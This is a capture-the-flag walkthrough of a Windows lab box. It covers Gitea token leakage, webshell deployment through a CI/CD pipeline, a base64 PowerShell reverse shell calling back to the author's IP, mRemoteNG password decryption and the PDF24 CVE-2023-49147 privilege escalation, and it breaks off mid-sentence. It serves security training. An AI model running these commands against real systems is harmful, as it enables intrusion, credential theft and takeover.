,\u0026#34;HTTP/1\\.1\\x20400\\x20Bad\\x20Request\\r\\nContent-Type:\\x20text/plai SF:n;\\x20charset=utf-8\\r\\nConnection:\\x20close\\r\\n\\r\\n400\\x20Bad\\x20Reques SF:t\u0026#34;); Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port Device type: general purpose Running (JUST GUESSING): Microsoft Windows 2022|2012|2016 (89%) OS CPE: cpe:/o:microsoft:windows_server_2022 cpe:/o:microsoft:windows_server_2012:r2 cpe:/o:microsoft:windows_server_2016 Aggressive OS guesses: Microsoft Windows Server 2022 (89%), Microsoft Windows Server 2012 R2 (85%), Microsoft Windows Server 2016 (85%) No exact OS matches for host (test conditions non-ideal). Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: | smb2-time: | date: 2025-09-01T18:03:15 |_ start_date: N/A | smb2-security-mode: | 3:1:1: |_ Message signing enabled but not required OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 293.26 seconds Findings: This is very interesting as we can see that there is a Gitea instance which runs using Golang on port 3000. Gitea is a self hosted git instance which means there could be source code there so it\u0026rsquo;s worth a look. We can also see that the system is running Windows Server 2022 and that smb 3.1 is running. SMB 445: Attempting to connect with NULL \u0026amp; Guest sessions: This is a standard check I always try as alot of the time the guest account or null sessions can lead to a foothold:\nnetexec smb $box -u \u0026#39;guest\u0026#39; -p \u0026#39;\u0026#39; --shares netexec smb $box -u \u0026#39;\u0026#39; -p \u0026#39;\u0026#39; --shares As we can see both accounts have been disabled or locked. +Note+: Even though we cannot authenticate with these we can still see the build number is +2038+ which we can use for further enumeration. Web 80: WhatWeb: Lets run WhatWeb to see if I can glean some further information.\n#Command whatweb http://$box | sed \u0026#39;s/, /\\n/g\u0026#39; #Output http://10.129.234.64 [200 OK] Bootstrap Country[RESERVED][ZZ] HTML5 HTTPServer[Microsoft-IIS/10.0] IP[10.129.234.64] Lightbox Microsoft-IIS[10.0] Script Title[Lock - Index] X-Powered-By[ASP.NET] Results: As we can see it\u0026rsquo;s running IIS 10 and a site called Lightbox. +Note+: I use sed to display the output across multiple lines for easier readability. Enumerating Injection Points With Burpsuite: Web Enumeration via Burp Suite: When manually enumerating a Website, always use Burp Suite. This allows you to: Record all potential injection points. Capture relevant responses for each request, making it easier to analyze vulnerabilities and track your testing progress. Visiting The Site:\nIf we navigate to the site we can see it\u0026rsquo;s a single page site for a company called GP that provides document solutions. It\u0026rsquo;s a single page site and when interacting with the site the buttons just work to reload the page.\nDirbusting The Webserver Running Using FFUF: We can perform some directory busting to see if there are any interesting directories.\nffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/combined_directories.txt -u http://$box/FUZZ -ic Nothing really interesting here. +Note+: %5c is just a url encoded backslash \\\nFile Enumeration Using FFUF: We can perform some file busting to see if there are any interesting files with the extension, .html we saw on the main page and in the ffuf results.\nffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/combined_directories.txt -u http://$box/FUZZ.html -ic As we can see nothing else here just the index page. Subdomain Enumeration with FFUF: Let\u0026rsquo;s enumerate any possible subdomains with ffuf.\nffuf -w /home/kali/Wordlists/seclists/Discovery/DNS/combined_subdomains.txt:FUZZ -u http://$box -H \u0026#34;Host:FUZZ.$domain\u0026#34; -ic -fs 16054 No subdomains to be found. Gitea 3000: As we saw web looks to be a dead-end however we still have Gitea on 3000 to look at.\nWe will be repeating all of the steps we used for port 80 (web) here also as we are running a webserver.\nWhatWeb: Lets run WhatWeb to see if I can glean some further information.\n#Command whatweb http://$box:3000 | sed \u0026#39;s/, /\\n/g\u0026#39; #Output http://10.129.234.64:3000 [200 OK] Cookies[_csrf,i_like_gitea] Country[RESERVED][ZZ] HTML5 HttpOnly[_csrf,i_like_gitea] IP[10.129.234.64] Meta-Author[Gitea - Git with a cup of tea] Open-Graph-Protocol[website] PoweredBy[Gitea] Script Title[Gitea: Git with a cup of tea] X-Frame-Options[SAMEORIGIN] Results: As we expected, Gitea is running. Dirbusting The Webserver Running Using FFUF: We can perform some directory busting to see if there are any interesting directories.\nffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/combined_directories.txt -u http://$box:3000/FUZZ -fs [ignoreSize] -ic As we can see there is the standard \u0026ldquo;administrator\u0026rdquo; page.\nWhat is more interesting is the sitemap.xml file we can see here.\nExploring The sitemap.xml Using wget \u0026amp; xmllint: +Note+: This entire part can also be done by visiting the site in the browser, I just wanted to mix it up and just use wget and xmllint to enumerate via the sitemaps.\nIf run a wget on the file and pipe it through xmllint so it renders nicely we can see it provides further sitemaps for repos and users.\nwget -qO- http://$box:3000/sitemap.xml | xmllint --format - As you can see it lists these as being on localhost so we just need to substitute the actual box ip (which I have set as the bash variable $box.\nExploring Users:\nwget -qO- http://$box:3000/explore/users/sitemap-1.xml | xmllint --format - We can see there are two registered users ellen.freeman \u0026amp; administrator we can add ellen to our list usernames and we also have a url we can now visit.\nFinding A dev-scripts Repo By Exploring with wget \u0026amp; xmllint: wget -qO- http://$box:3000/explore/repos/sitemap-1.xml | xmllint --format - We can see that ellen freeman as a repo called dev-scripts\nLet\u0026rsquo;s see if we can access the dev-scripts repo:\nwget -qO- http://$box:3000/ellen.freeman/dev-scripts | head -n 20 As we can see we can access it. Let\u0026rsquo;s jump into the browser now to explore further.\n+Note+: I am piping into head \u0026amp; showing the first 20 lines with -n 20 as there is no reason to dump the entire page to the console. Doing it this way allows us to see if we can access it.\nAccessing the dev-scripts repo: Accessing the site, we can see that there is one file, two commits, and one branch.\nFirst, let’s take a look at the file. We can do this by clicking on repos.py: The file contains the Python code below. Let’s break it down so we understand what’s going on.\nCode Review of repos.py: import requests import sys import os def format_domain(domain): if not domain.startswith((\u0026#39;http://\u0026#39;, \u0026#39;https://\u0026#39;)): domain = \u0026#39;https://\u0026#39; + domain return domain def get_repositories(token, domain): headers = { \u0026#39;Authorization\u0026#39;: f\u0026#39;token {token}\u0026#39; } url = f\u0026#39;{domain}/api/v1/user/repos\u0026#39; response = requests.get(url, headers=headers) if response.status_code == 200: return response.json() else: raise Exception(f\u0026#39;Failed to retrieve repositories: {response.status_code}\u0026#39;) def main(): if len(sys.argv) \u0026lt; 2: print(\u0026#34;Usage: python script.py \u0026lt;gitea_domain\u0026gt;\u0026#34;) sys.exit(1) gitea_domain = format_domain(sys.argv[1]) personal_access_token = os.getenv(\u0026#39;GITEA_ACCESS_TOKEN\u0026#39;) if not personal_access_token: print(\u0026#34;Error: GITEA_ACCESS_TOKEN environment variable not set.\u0026#34;) sys.exit(1) try: repos = get_repositories(personal_access_token, gitea_domain) print(\u0026#34;Repositories:\u0026#34;) for repo in repos: print(f\u0026#34;- {repo[\u0026#39;full_name\u0026#39;]}\u0026#34;) except Exception as e: print(f\u0026#34;Error: {e}\u0026#34;) if __name__ == \u0026#34;__main__\u0026#34;: main() Imports: import requests import sys import os The script begins by importing the required modules.\nformat_domain function: def format_domain(domain): if not domain.startswith((\u0026#39;http://\u0026#39;, \u0026#39;https://\u0026#39;)): domain = \u0026#39;https://\u0026#39; + domain return domain This function takes one argument, domain. It checks whether the domain starts with http:// or https://. If not, it prepends https:// to the domain and returns the result.\nget_repositories function: def get_repositories(token, domain): headers = { \u0026#39;Authorization\u0026#39;: f\u0026#39;token {token}\u0026#39; } url = f\u0026#39;{domain}/api/v1/user/repos\u0026#39; response = requests.get(url, headers=headers) if response.status_code == 200: return response.json() else: raise Exception(f\u0026#39;Failed to retrieve repositories: {response.status_code}\u0026#39;) This function takes two arguments: token and domain. It builds a header containing the authorization token and constructs the API endpoint URL.\nIt then performs a GET request to the API.\nIf the response status code is 200, it returns the JSON response. Otherwise, it raises an exception with the status code. main function: This is the main function of the script. I’ll break it down into smaller sections.\nArgument Length Check:\ndef main(): if len(sys.argv) \u0026lt; 2: print(\u0026#34;Usage: python script.py \u0026lt;gitea_domain\u0026gt;\u0026#34;) sys.exit(1) The script checks whether an argument (the Gitea domain) was provided. If not, it prints a usage message and exits.\nSet the Gitea Domain Value:\ngitea_domain = format_domain(sys.argv[1]) Here, the script sets the value of gitea_domain to the return value of format_domain(sys.argv[1]).\nFor example: If the user runs python script.py http://mygiteadomain.com, the variable will be set to http://mygiteadomain.com.\nPersonal Access Token:\npersonal_access_token = os.getenv(\u0026#39;GITEA_ACCESS_TOKEN\u0026#39;) if not personal_access_token: print(\u0026#34;Error: GITEA_ACCESS_TOKEN environment variable not set.\u0026#34;) sys.exit(1) This is arguably the most interesting part of the script.\nIt attempts to read the environment variable GITEA_ACCESS_TOKEN using os.getenv. If the variable is not set, the script prints an error and exits.\nWhy is this important?\nDevelopers often store access tokens in .env files, which are excluded via .gitignore. In practice, many developers accidentally commit tokens while hardcoding them during testing. +Once we finish this code review, we’ll check the Git history to see if any secrets were exposed.+\nPrint Repository List:\nrepos = get_repositories(personal_access_token, gitea_domain) print(\u0026#34;Repositories:\u0026#34;) for repo in repos: print(f\u0026#34;- {repo[\u0026#39;full_name\u0026#39;]}\u0026#34;) except Exception as e: print(f\u0026#34;Error: {e}\u0026#34;) Finally, the script fetches the repositories by calling get_repositories with the domain and token. It then loops through the returned JSON and prints each repository’s full_name.\nFinding Committed Secret in Previous Commits: Now that we know what the script does let\u0026rsquo;s check to see if there are any hardcoded secrets present in previous commits.\nWe can do this by clicking the \u0026ldquo;history\u0026rdquo; button. In it we can see the two commits that the user ellen has made. Let\u0026rsquo;s check the initial commit. As we can see there is a hard-coded access token present in the commit so we can take that and check if it is still valid or if it has been revoked. PERSONAL_ACCESS_TOKEN = \u0026#39;43ce39bb0bd6bc489284f2905f033ca467a6362f\u0026#39; Testing If The Access Code Is Still Valid: An easy way for us to test if this token is still valid is to run the script with it.\nSetting Up Python venv: In order to keep things tidy let\u0026rsquo;s setup a venv.\n#Create the venv python3 -m venv repos #Activate the venv source repos/bin/activate Install Our Dependencies: pip3 install requests We only have to install the requests library as sys \u0026amp; os are part of the standard python libraries. Set Our Environemental Variable: # Set it export GITEA_ACCESS_TOKEN=\u0026#39;43ce39bb0bd6bc489284f2905f033ca467a6362f\u0026#39; # Check it echo $GITEA_ACCESS_TOKEN +Note+: This will only set it for the current shell/pane you are in so if you move shell/pane and want to use it again you will need to set it again.\nRun the Script: python3 repos.py http://10.129.234.64:3000/ As we can see this still works and we can make valid API calls with the token. We can also see it has access to a private repo called website.\nUsing GiteaProber.py To Enumerate Further Our Token Privileges: I decided to create a Gitea API probing tool so that I can easily check various endpoints using the API and a token. You can find that tool here: Gitea Prober We can run it with the below command.\npython3 GiteaProber.py --url http://10.129.234.64:3000 --token 43ce39bb0bd6bc489284f2905f033ca467a6362f As we can see from the output we get the repositories our user can access. We can also see there is a check performed to see if we can access all repositories however this requires admin privileges and is denied, letting us know this token does not have admin privileges. This is further reinforced by the findings displayed below, we can see as expected we can make queries regarding our user with the API and get 200 response however the admin API endpoints are forbidden. Downloading The Website Repo: Let\u0026rsquo;s download the private website repository.\nWe can pass the token as part of out git clone command effectively using it as a password for authorization.\ngit clone http://ellen.freeman:43ce39bb0bd6bc489284f2905f033ca467a6362f@10.129.234.64:3000/ellen.freeman/website.git Discovering The Website Uses A CI/CD pipeline: Reading the file readme.md in the main folder we can see it has the following lines. What does this mean?\nSide Quest What is CI/CD pipeline?\nA CI/CD pipeline is a system commonly used by developers to streamline the software lifecycle. The acronym stands for C-ontinuous I-ntegration and C-ontinuous D-elivery.\nIn practice, this means when developers push new code to the repository, the pipeline automatically kicks in. It will usually:\nRuns automated tests Builds the application Deploys the updated code to the server From an attacker’s perspective, this has a critical implication: If we can edit the repository and push our own changes, the pipeline will build and deploy them on the target server, +effectively giving us remote code execution (RCE)+.\nChecking Git Log: When we have access to a repository it\u0026rsquo;s also useful to check the history of the repository using git log this shows us the previous commits and commit messages. In this case the message is always (apart from the initial commit) \u0026ldquo;update\u0026rdquo; which is poor coding practices as it\u0026rsquo;s not descriptive or informative. +Tip+: I always recommend checking git log as sometimes you will see commits like \u0026ldquo;removed API key\u0026rdquo; etc and as we saw previously this user had alrady committed a key.\nSide Quest: Checking A Previous Commit\u0026rsquo;s Diff: We can easily see what was changed between commits by using the git show command and providing the commit hash. #Command git show [commit-hash] #Example git show 657a342b7a68f195f4 +Note+: We don\u0026rsquo;t need the full commit hash just 6/10 characters to view the commit. As we can see this commit just added the readme.md.\nCreating A POC: Making a Change to index.html To ensure this is the right path we need to create a Proof of Concept (POC) we can do this by making a small change to the site and seeing if it does in fact get processed by the CI/CD pipeline and pushed live to the site. To do this we can edit the index.html to include a comment in the footer. Pushing Our Changes To The Site: Now we need to push our changes.\n# Add our changes git add . # Use the same previously used commit message git commit -m \u0026#34;update\u0026#34; # Push our changes Verifying Our Changes Are Live: Now if we navigate to the site and inspect the page we can see our changes live on the site. 2. Foothold: Pushing A Webshell To The Host For RCE: As the host is running on windows we should be able to push an aspx webshell to the host to have it run.\nWe can use Laudanum for this. Laudanum, is a repository of pre-built files. Luckily it\u0026rsquo;s available by default on Kali \u0026amp; Parrot at_ /usr/share/webshells/laudanum/aspx or via laudanum Git . The repository includes injectable files for different web application languages such as ASP, ASPX, JSP, PHP, and more.\nCopy The Shell To The Repo: # Copy the file to the website repo cp /usr/share/webshells/laudanum/aspx/shell.aspx . +Note+: I put it in the /assets/img folder for ease. Add our IP to the list of whitelisted IP\u0026rsquo;s vim shell.aspx +Note+: This will not work unless we do this! Commit \u0026amp; Push Our Changes: git add . git commit -m \u0026#34;update\u0026#34; git push Check if we have RCE on the host: We do! Getting A Reverse Shell: Web shells are great but a reverse shell is better. We can use RevShells for this. +Tip+: They offer a Docker file to build your own image and run it locally, I like to do this in-case I am on engagement with no internet access.\nLet\u0026rsquo;s use the PowerShell #3 base64 encoded webshell. I tend to find base64 encoded reverse shells play nicer when executing them via webshells. powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA0AC4AMgAxADYAIgAsADkAOAA5ADgAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACIAUABTACAAIgAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACIAPgAgACIAOwAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA +Note+: Don\u0026rsquo;t use this one as it has my IP and port in it.\nLet\u0026rsquo;s start out listener\nrlwrap -cAr nc -nvlp 9898 We then paste the shell into the cmd/c box of Laudanum and hit enter. Shell caught. Enumerating As Ellen.Freeman: As the gitea instance is running in the context of the user ellen.freeman we are logged in as her (naughty naughty), services should be run as service accounts with long strong passwords. There is another user gale.dekarios on the host too. We can add their name to our list of user names. +Note+: There is also a .ssh folder but as the service is not running and there are no keys contained it\u0026rsquo;s a bust.\nDiscovering Ellen\u0026rsquo;s gitea password. Looking in Ellen\u0026rsquo;s home directory we can see there is a .git-credentials file present. We can see it contains a clear text password Let\u0026rsquo;s verify if this is her password in Gitea. We can see we are signed in as ellen.freeman Checking: pull requests, repositories, mentions as well as personal settings like Security, SSH/GPG Keys, Actions(Secrets \u0026amp; Variables) does not provide any further information and there is no further interesting information here at present. 3. Lateral Movement: Discovering Gale.Dekarios Password. While checking through Ellen’s Documents folder we came across a file named config.xml. Dumping the file with cat reveals that it contains what looks like a hashed password: This file belongs to a program called mRemoteNG.\nSide Quest: What is mRemoteNG? mRemoteNG is a tool for managing and connecting to remote systems using protocols such as RDP, VNC, SSH, and more. On this host, we already know that RDP is running on port 3389.\n+Official Documentation+: mRemoteNG Docs By default, mRemoteNG stores connection details (including credentials) inside a file called confCons.xml.\nThe typical path for this file is:\n%USERPROFILE%\\APPDATA\\Roaming\\mRemoteNG On the target system we can indeed locate the confCons.xml file: +Note+: The contents here match the earlier config.xml we discovered. However, it’s important to remember that mRemoteNG often creates backup copies of this file. These may contain older or alternative credentials, so they’re always worth checking. I have checked these backups and they have no additional interesting information.\nHere’s the interesting part: mRemoteNG +uses a hardcoded default master password of+ mR3m +to encrypt credentials+. If a user hasn’t set their own master password, all saved credentials can be decrypted from the config file.\nExample of stored data:\nThe Master Password Hash is stored in the value of Protected:\n\u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;utf-8\u0026#34;?\u0026gt; \u0026lt;mrng:Connections xmlns:mrng=\u0026#34;http://mremoteng.org\u0026#34; Name=\u0026#34;Connections\u0026#34; Export=\u0026#34;false\u0026#34; EncryptionEngine=\u0026#34;AES\u0026#34; BlockCipherMode=\u0026#34;GCM\u0026#34; KdfIterations=\u0026#34;1000\u0026#34; FullFileEncryption=\u0026#34;false\u0026#34; Protected=\u0026#34;u5ojv17tIZ1H1ND1W0YqvCslhrNSkAV6HW3l/hTV3X9pN8aLxxSUoc2THyWhrCk18xWnWi+DtnNR5rhTLz59BBxo\u0026#34; ConfVersion=\u0026#34;2.6\u0026#34;\u0026gt; ..SNIP Node Connection Information:\nEach \u0026lt;Node element defines connection details for a specific target (RDP, SSH, etc.).\nIn the snippet below, we can see a node for the user Gale.Dekarios (note: not joined to a domain).\nThe password is stored here in encrypted form:\n\u0026lt;Node Name=\u0026#34;RDP/Gale\u0026#34; Type=\u0026#34;Connection\u0026#34; Descr=\u0026#34;\u0026#34; Icon=\u0026#34;mRemoteNG\u0026#34; Panel=\u0026#34;General\u0026#34; Id=\u0026#34;a179606a-a854-48a6-9baa-491d8eb3bddc\u0026#34; Username=\u0026#34;Gale.Dekarios\u0026#34; Domain=\u0026#34;\u0026#34; Password=\u0026#34;LYaCXJSFaVhirQP9NhJQH1ZwDj1zc9+G5EqWIfpVBy5qCeyyO1vVrOCRxJ/LXe6TmDmr6ZTbNr3Br5oMtLCclw==\u0026#34; Hostname=\u0026#34;Lock\u0026#34; Protocol=\u0026#34;RDP\u0026#34; PuttySession=\u0026#34;Default Settings\u0026#34; Port=\u0026#34;3389\u0026#34; ConnectToConsole=\u0026#34;false\u0026#34; UseCredSsp=\u0026#34;true\u0026#34; RenderingEngine=\u0026#34;IE\u0026#34; ICAEncryptionStrength=\u0026#34;EncrBasic\u0026#34; RDPAuthenticationLevel=\u0026#34;NoAuth\u0026#34; /\u0026gt; Decrypting Gale.Dekarios\u0026rsquo;s RDP Password: There is a fantastic tool called mRemoteNG_password_decrypt which we can use do decrypt the master password.\nClone The Repo :\ngit clone https://github.com/gquere/mRemoteNG_password_decrypt.git cd mRemoteNG_password_decrypt Now we run the tool.\npython3 mremoteng_decrypt.py config.xml And we get a clear text password. Accessing the Host Via RDP As Gale: Now we have the cred\u0026rsquo;s let\u0026rsquo;s see if we can access the host as Gale using the creds\nxfreerdp3 /v:$box /u:$user /p:$pass /drive:/tmp,/home/kali/windowsTools +Note+: We can easily mount a folder using the /drive: flag. I like to do this so I can easily access some useful windows tools.\nWe have access! Let\u0026rsquo;s get our flag 4. Privilege Escalation: Discovering PDF24 Can Be Used For Local Privesc CVE-2023-49147: We can see on the desktop there is a program called PDF24.\nAfter a quick search online we can see there is a local privilege escalation vector for this software sec-consultant article Reading the article there are a few conditions that need to be met for this exploit to be possible.\nThe software must be either 11.14.0 (pdf24-creator-11.14.0-x64.msi) or 11.15.1 (pdf24-creator-11.15.1-x64.msi) The software must have been installed using the msi installer. A browser such as Chrome of Firefox must be present. We will also need the following files: A copy of the msi installer. A program called SetOpLock.exe available from Google Project Zero get-childitem -Recurse -Path C:\\Users\\*.msi | select-string -Pattern pdf24 -ErrorAction SilentlyContinue 1. Checking PDF24 Creator Version: We can check the version by scrolling to the bottom of the window and selecting About PDF24 Creator we can see it\u0026rsquo;s listed as 11.15.1 As we can see in the article this is a vulnerable version of the application. 2. Checking If PDF24 Creator Was Installed Using MSI: To check if the program was installed via MSI we can use the following command in PowerShell.\nGet-ChildItem \u0026#34;HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall\u0026#34;, \u0026#34;HKLM:\\SOFTWARE\\WOW6432Node\\Microsoft\\Windows\\CurrentVersion\\Uninstall\u0026#34; | Get-ItemProperty | Where-Object { $_.WindowsInstaller -eq 1 } | Select-Object DisplayName, DisplayVersion, Publisher, InstallDate As we can see from the output/screenshot, it was installed using the MSI installer. Breaking Down the PowerShell Command to Find MSI-Installed Software:\nLet’s break down the command so it makes sense.\nStep 1: Enumerate the uninstall registry hives\nWe’re querying two registry hive paths that populate “Programs and Features”:\n# ⟶ native 64-bit apps HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall # ⟶ 32-bit apps on x64 HKLM:\\SOFTWARE\\WOW6432Node\\Microsoft\\Windows\\CurrentVersion\\Uninstall These contain one subkey per installed application/entry.\nStep 2: Read properties from each product key\nGet-ItemProperty reads values from each subkey (e.g., DisplayName, DisplayVersion, Publisher, InstallDate, and WindowsInstaller) and passes them down the pipeline.\nGet-ItemProperty | Step 3: Keep only MSI-based installs\nWe filter to entries written by Windows Installer (MSI) by checking for WindowsInstaller = 1.\nWhere-Object { $_.WindowsInstaller -eq 1 } | Step 4: Trim to useful, readable columns\nFinally, we select the fields we actually care about for quick triage.\nSelect-Object DisplayName, DisplayVersion, Publisher, InstallDate Command In Plain English\n“Hey Windows: look at all your installed 32-bit and 64-bit programs, keep only the ones installed via the MSI engine, and show me the Name, Version, Publisher, and Install Date.”\nReal Output (from the host)\nBelow is the actual output from the target host, showing PDF24 Creator present and MSI-installed:\nDisplayName DisplayVersion Publisher InstallDate ----------- -------------- --------- ----------- Microsoft Visual C++ 2022 X64 Additional Runtime - 14.40.33810 14.40.33810 Microsoft Corporation 20250415 VMware Tools 12.5.0.24276846 VMware, Inc. 20250415 PDF24 Creator 11.15.1 geek software GmbH 20231228 Microsoft Visual C++ 2022 X64 Minimum Runtime - 14.40.33810 14.40.33810 Microsoft Corporation 20250415 Microsoft Visual C++ 2022 X86 Minimum Runtime - 14.40.33810 14.40.33810 Microsoft Corporation 20250415 mRemoteNG 1.76.20.24615 Next Generation Software 20231228 Microsoft Visual C++ 2022 X86 Additional Runtime - 14.40.33810 14.40.33810 Microsoft Corporation 20250415 +Note+: InstallDate is typically recorded as YYYYMMDD (e.g., 20231228) and may be blank on some entries.\nBonus: Grab the MSI ProductCode (GUID) / uninstall string for a target\nIf we need the MSI ProductCode (often the key name) or uninstall string for PDF24:\nGet-ChildItem \u0026#34;HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall\u0026#34;, \u0026#34;HKLM:\\SOFTWARE\\WOW6432Node\\Microsoft\\Windows\\CurrentVersion\\Uninstall\u0026#34; | Get-ItemProperty | Where-Object { $_.WindowsInstaller -eq 1 -and $_.DisplayName -like \u0026#34;*PDF24*\u0026#34; } | Select-Object DisplayName, PSChildName, UninstallString PSChildName ⟶ usually the MSI ProductCode {GUID} UninstallString ⟶ the msiexec command used to remove/repair 3. Checking If Chrome Or Firefox Is Installed: We can see on the desktop that Firefox is installed 4. Getting The Relevant Files For CVE-2023-49147: PDF24 Creator MSI Installer:\nWe can perform a quick search on the host to find out if the .msi file has been left on it.\nGet-ChildItem -Path C:\\ -Filter \u0026#39;*pdf24*.msi\u0026#39; -Recurse -File -Force -ErrorAction SilentlyContinue +Note+: This command will recursively search from the root of the C:\\ drive searching for all all .msi files that have the string pdf24 in them. We get a hit and see the installer is stored under C:\\_install so we have the .msi which we need. You will notice that if we go to the root of C:\\ we cannot see this folder, this means the folder was intentionally hidden by the user, however hidden folders are not excluded from searches as you can see. SetOpLock.exe:\nWe now just need the SetOpLock.exe file which we can get from github. However I am feeling lazy today (and kind of in a rush right now) so let\u0026rsquo;s search for some pre-compliled binaries.\nLuckily p1sc3s has uploaded a lovely set of binaries to their github which we can can find here . We can git clone these \u0026amp; then copy the binary into our shared mounted folder with the host.\ngit clone https://github.com/p1sc3s/Symlink-Tools-Compiled Exploiting CVE-2023-49147 For PDF24 Creator Privilege Escalation: To run this exploit we will need to have two powershell windows open.\nFirst let\u0026rsquo;s set an oplock on the file using SetOpLock.exe\ncd \\\\tsclient\\_tmp\\Symlink-Tools-Compiles .\\SetOpLock.exe \u0026#34;C:\\Program Files\\PDF24\\faxPrnInst.log\u0026#34; r Now let\u0026rsquo;s trigger the repair of the PDF24 Creator msi file.\nmsiexec.exe /fa C:\\_install\\pdf24-creator-11.15.1-x64.msi +Notes+: This part can take a while so be patient.\nEnsure you click \u0026ldquo;OK\u0026rdquo; Right click on the top bar of the cmd window \u0026amp; click on \u0026ldquo;properties\u0026rdquo;.\nUnder options click on the \u0026ldquo;Legacyconsolemode\u0026rdquo; link\nOpen the link with Firefox.\nIn the opened browser press Ctrl+o to open up a file browser \u0026amp; type cmd.exe in the top bar and then press ENTER on your keyboard.\n+Note+: Do not press \u0026ldquo;Open\u0026rdquo; just press \u0026ldquo;ENTER\u0026rdquo;\nWe now have a system shell !!! Here is a quick re-cap of what we just did.\nStage 1: Privilege — The repair runs as SYSTEM. Stage 2: Visibility — A SYSTEM process should be invisible to the user; however here it is visible (console window). Stage 3: Stall — We paused the SYSTEM process at the right time (oplock on the log) so the window stays open. Stage 4: Pivot — A help link inside that SYSTEM UI launches the browser as SYSTEM. Stage 5: Execute — From the SYSTEM browser, you start cmd.exe as SYSTEM. Let\u0026rsquo;s get our flag. TODO CVE-2023-49147 — Why the PDF24 MSI “Repair” Leads to SYSTEM (Explained Simply) TL;DR (Plain English) Explanation of CVE-2023-49147 PDF24 Creator Privesc: The PDF24 Creator MSI (CVE-2023-49147) can be repaired by a standard user, but its repair routine launches a helper as SYSTEM \u0026amp; because of the MSI’s configuration, shows a visible SYSTEM console in the user’s desktop. If you stall that helper at the moment it writes to a log (via an oplock), the console remains open, exposing a properties → help link that enables us to launch the default browser as SYSTEM. From there, it\u0026rsquo;s possible to use the browsers Open File dialog to start cmd.exe SYSTEM shell.\nThe underlying flaw is mixing privileged execution with interactive UI, allowing a non-admin to pivot from a visible SYSTEM process to a full SYSTEM session. The vendor has since shipped a patch to ensure elevated installer actions never present interactively in the UI.\nTL;DR One sentence explanation:\nA privileged, non-impersonating custom action in the MSI creates interactive UI (console + clickable link) in the user’s session, letting a non-admin bridge from a SYSTEM process to a SYSTEM-owned browser and then to a SYSTEM shell.\nPreconditions (What must be true) To Execute Privilege Escalation Via CVE-2023-49147: PDF24 Creator was installed via MSI and per-machine (typical Admin install). PDF24 Version is either of the versions below. 11.14.0 11.15.1 You have local GUI access (no admin needed). You trigger an MSI repair for PDF24 Creator. The default browser is +not+ Edge/IE on Windows 11. UAC does not prompt (Windows Installer service performs the privileged work for per-machine maintenance). The Core Mechanism (Why this works) Step By Step: Windows Installer runs privileged maintenance as SYSTEM.\nFor per-machine installs, the Windows Installer service (msiserver) executes many repair steps with LocalSystem privileges, even when a standard user initiates the repair. Installer “custom actions” or helper binaries can therefore run non-impersonated as SYSTEM during repair. A SYSTEM process shows an interactive console on your desktop.\nDuring repair, PDF24’s helper (pdf24-PrinterInstall.exe) gets launched as SYSTEM and (due to the MSI configuration) spawns a visible console window into the user’s interactive session. +Why this is bad+: SYSTEM processes should +not+ present interactive UI on a user’s desktop. Doing so gives the user/attackers ways to pivot that SYSTEM context into something useful. You keep the SYSTEM console alive by stalling a file write.\nThe helper writes to a log the log file faxPrnInst.log located at C:\\Program Files\\PDF24\\faxPrnInst.log By setting an opportunistic lock (oplock) on that file right as it’s accessed, the write blocks, which keeps the SYSTEM console window open instead of closing immediately when the repair finishes. From the console’s properties, a SYSTEM browser is launched.\nIn the console’s title-bar menu, “Properties” exposes a “Legacy console mode” help link. Clicking that help link launches the default browser to a Microsoft help page, but crucially it inherits SYSTEM from the console process. From a SYSTEM browser to a SYSTEM shell.\nIn that SYSTEM browser, using the Open File dialog (e.g., Ctrl+O) and entering cmd.exe spawns a SYSTEM command 